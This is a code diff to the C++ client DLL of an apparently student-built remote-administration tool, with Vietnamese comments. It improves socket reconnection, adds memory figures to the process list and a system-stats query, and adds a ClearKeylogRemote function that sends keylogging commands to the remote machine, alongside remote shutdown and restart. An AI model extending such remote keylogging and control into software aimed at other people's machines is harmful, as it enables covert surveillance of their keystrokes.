@@ -80,16 +80,32 @@ DLLEXPORT void InitWinsock() {
 }
 
 DLLEXPORT bool ConnectToServer(const char* ip, int port) {
-    if (clientSocket != INVALID_SOCKET) return true; 
+    // 1. Nếu đang có socket cũ (dù lỗi hay không), đóng nó đi để làm mới
+    if (clientSocket != INVALID_SOCKET) {
+        closesocket(clientSocket);
+        clientSocket = INVALID_SOCKET;
+    }
 
+    // 2. Tạo socket mới
     clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (clientSocket == INVALID_SOCKET) {
+        cout << "[LOI] Khong the tao socket." << endl;
+        return false;
+    }
+
     sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port); 
     addr.sin_addr.s_addr = inet_addr(ip);
     
+    // 3. Thử kết nối (Có timeout mặc định của Windows khoảng 20s)
     if (connect(clientSocket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
         cout << "[LOI] Ket noi that bai toi " << ip << ":" << port << endl;
+        
+        // [QUAN TRỌNG] Reset biến socket về trạng thái vô hiệu
+        closesocket(clientSocket);
+        clientSocket = INVALID_SOCKET; 
+        
         return false;
     } else {
         cout << "[OK] Ket noi thanh cong toi " << ip << ":" << port << endl;
@@ -130,8 +146,10 @@ DLLEXPORT const char* GetAppList() {
             string name = receiveLine();
             string id = receiveLine();
             string threads = receiveLine();
-            // Định dạng: id|name|threads
-            ss << id << "|" << name << "|" << threads << "\n";
+            string memory = receiveLine(); // [MỚI] Đọc thêm dòng Memory
+
+            // Format: id|name|threads|memory
+            ss << id << "|" << name << "|" << threads << "|" << memory << "\n";
         }
     }
     sendCommandInternal("QUIT");
@@ -555,4 +573,35 @@ DLLEXPORT void ShutdownServer() {
 
 DLLEXPORT void RestartServer() {
     if (clientSocket != INVALID_SOCKET) sendCommandInternal("RESTART");
+}
+
+
+DLLEXPORT const char* GetSystemStats() {
+    if (clientSocket == INVALID_SOCKET) return "0|0|0|0|0";
+    sendCommandInternal("MONITOR");
+
+    // Timeout ngắn
+    DWORD timeout = 2000;
+    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    string data = receiveLine(); // Nhận: CPU|RAM|DISK
+
+    // Reset timeout
+    DWORD defaultTimeout = 20000;
+    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&defaultTimeout, sizeof(defaultTimeout));
+
+    g_result_buffer = data;
+    return g_result_buffer.c_str();
+}
+
+DLLEXPORT void ClearKeylogRemote() {
+    if (clientSocket == INVALID_SOCKET) return;
+    
+    sendCommandInternal("KEYLOG"); Sleep(50);
+    sendCommandInternal("CLEAR");  // Gửi lệnh xóa mới thêm
+    
+    // Đọc phản hồi "OK" hoặc "ERR" để dọn sạch buffer
+    receiveLine(); 
+    
+    sendCommandInternal("QUIT");
 }
